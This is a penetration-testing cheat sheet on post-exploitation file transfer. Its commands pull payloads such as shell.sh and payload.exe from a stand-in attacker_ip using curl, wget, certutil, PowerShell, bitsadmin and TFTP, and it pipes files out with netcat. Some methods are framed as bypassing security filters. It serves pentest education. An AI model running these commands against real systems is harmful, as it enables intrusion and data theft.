# Data exfiltration 

Comprehensive Guide: File Transfer Methods in Penetration Testing

Moving files between an attacker’s machine and a target system is a critical skill in penetration testing, often referred to as Post-Exploitation File Transfer.

1. Web-Based Servers (Attacker Side)
These methods turn your machine into a temporary hosting hub for tools and scripts.

Python HTTP Server: A quick way to host files.
Python 3: python3 -m http.server 80
Python 2: python -m SimpleHTTPServer 80
PHP Built-in Web Server: Useful if Python isn't available.
php -S 0.0.0.0:80
HFS (HTTP File Server): A standalone GUI-based Windows tool (by Rejetto) that is very beginner-friendly for hosting files over HTTP.
 

2. Native Command-Line Downloaders (Target Side)
Once you have a shell on the target, use these built-in utilities to pull your files.

CURL: A versatile tool for transferring data with URLs.
curl http://<attacker_ip>/shell.sh -o shell.sh
Wget: The standard non-interactive network downloader for Linux.
wget http://<attacker_ip>/linpeas.sh
Certutil (Added): A common Windows "living off the land" (LotL) technique.
certutil -urlcache -f http://<attacker_ip>/payload.exe payload.exe
 

3. Windows-Specific Methods
These utilize native Windows features to move files, often bypassing basic security filters.

PowerShell File Transfer: Using Invoke-WebRequest or WebClient objects.
iwr -uri http://<attacker_ip>/file.exe -OutFile file.exe
Bitsadmin: A command-line tool used to create download jobs. Note: This is being deprecated in favor of PowerShell but still highly effective.
bitsadmin /transfer myjob /download /priority high http://<attacker_ip>/file.exe C:\temp\file.exe
SMB (Python SMB Server): Using Impacket’s smbserver.py to create a share that Windows targets can access like a network drive.
sudo impacket-smbserver shareName ./
 

 

4. Direct Connection & Legacy Protocols
Methods used when standard web ports are blocked or when specific services are available.

FTP (File Transfer Protocol): Requires an FTP server on the attacker side. Can be scripted on Windows using ftp -s:commands.txt.
TFTP (Trivial FTP): A UDP-based protocol. Often used for older networking gear or specific Windows environments.
tftp -i <attacker_ip> GET file.exe
Netcat (NC): The "Swiss Army Knife" of networking. You can pipe files directly over a connection.
Receiver: nc -l -p 1234 > file.txt
Sender: nc <target_ip> 1234 < file.txt
 

 

5. Essential Additions (Missing from Original)
To make your toolkit truly robust, consider these common modern methods:

SCP / SSH (Secure Copy): If you have SSH credentials, this is the most secure way to move files.
scp file.txt user@remote:/path/
RDP Shortcuts (Added): If you have Remote Desktop access, you can use shared clipboards or "Map Local Drives" to drag and drop files.
Base64 Encoding (Added): When all else fails, encode a small binary into a Base64 string, paste it into the terminal, and decode it on the target.
base64 -w 0 file.exe (Copy string) -> echo "string" | base64 -d > file.exe (On target)
 

 